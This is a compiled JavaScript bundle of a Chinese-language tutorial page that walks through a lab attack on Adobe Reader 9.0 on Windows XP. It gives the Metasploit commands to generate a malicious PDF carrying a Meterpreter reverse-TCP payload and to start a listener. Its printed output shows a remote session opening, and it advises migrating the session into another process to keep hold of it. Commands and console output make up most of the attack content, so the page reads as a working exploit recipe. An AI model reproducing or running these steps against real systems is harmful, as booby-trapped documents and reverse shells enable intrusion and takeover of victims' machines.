(window.webpackJsonp=window.webpackJsonp||[]).push([[200],{491:function(s,t,a){"use strict";a.r(t);var n=a(7),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"基于pdf文件格式的渗透攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#基于pdf文件格式的渗透攻击"}},[s._v("#")]),s._v(" 基于PDF文件格式的渗透攻击")]),s._v(" "),t("p",[s._v("攻击机 Kali 192.168.175.128")]),s._v(" "),t("p",[s._v("靶机 WinXP 192.168.175.130")]),s._v(" "),t("p",[s._v("漏洞程序： Adobe Reader 9.0")]),s._v(" "),t("h2",{attrs:{id:"生成pdf文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#生成pdf文件"}},[s._v("#")]),s._v(" 生成PDF文件")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfconsole\nuse exploit/windows/fileformat/adobe_cooltype_sing \n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nshow options\nexploit\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("具体如下所示：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msf5 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/windows/fileformat/adobe_cooltype_sing \nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" windows/meterpreter/reverse_tcp\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nLHOST "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show options\n\nModule options "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("exploit/windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   FILENAME  msf.pdf          "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" name.\n\n\nPayload options "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/meterpreter/reverse_tcp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       Exit technique "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Accepted: "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v(", seh, thread, process, none"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   LHOST     "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128  "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen address "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("an interface may be specified"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   LPORT     "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("             "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen port\n\n   **DisablePayloadHandler: True   "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("RHOST and RPORT settings will be ignored"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("**\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("   Automatic\n\n\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Creating "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'msf.pdf'")]),s._v(" file"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("+"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" msf.pdf stored at /root/.msf4/local/msf.pdf\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/fileformat/adobe_cooltype_sing"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br")])]),t("p",[s._v("可以看到在/root/.msf4/local/目录下生成了msf.pdf。")]),s._v(" "),t("p",[s._v("实际中，我们需要想办法将这个文件传到靶机上。这里为了简单，我直接将文件拷贝到靶机上。")]),s._v(" "),t("h2",{attrs:{id:"上传pdf到靶机"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#上传pdf到靶机"}},[s._v("#")]),s._v(" 上传PDF到靶机")]),s._v(" "),t("p",[s._v("将生成的msf.pdf上传到靶机")]),s._v(" "),t("h2",{attrs:{id:"实施攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#实施攻击"}},[s._v("#")]),s._v(" 实施攻击")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfconsole\nuse exploit/multi/handler \n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\nshow options\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nexploit\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br")])]),t("p",[s._v("具体如下：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msf5 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use exploit/multi/handler \nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" windows/meterpreter/reverse_tcp\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" show options\n\nModule options "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("exploit/multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("windows/meterpreter/reverse_tcp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(":\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       Exit technique "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Accepted: "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("''")]),s._v(", seh, thread, process, none"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   LHOST                      "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen address "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("an interface may be specified"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n   LPORT     "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("             "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("   Wildcard Target\n\n\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nLHOST "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nmsf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Started reverse TCP handler on "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br")])]),t("h2",{attrs:{id:"打开pdf文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#打开pdf文件"}},[s._v("#")]),s._v(" 打开PDF文件")]),s._v(" "),t("p",[s._v("在靶机上利用Adobe Reader 9.0打开PDF文件")]),s._v(" "),t("h2",{attrs:{id:"查看获得的meterpreter"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看获得的meterpreter"}},[s._v("#")]),s._v(" 查看获得的Meterpreter")]),s._v(" "),t("p",[s._v("在攻击机Kali上，我们看到MSF控制台中获得了Meterpreter权限。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msf5 exploit"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Started reverse TCP handler on "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 \n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Sending stage "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("179779")]),s._v(" bytes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" to "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Meterpreter session "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" opened "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 -"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.130:1431"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" at "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2019")]),s._v("-01-24 "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("16")]),s._v(":05:52 +0800\n\nmeterpreter "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("p",[t("strong",[s._v("最后，最好用migrate命令将当前会话进程绑定到系统的其他进程中。")])]),s._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=e.exports}}]);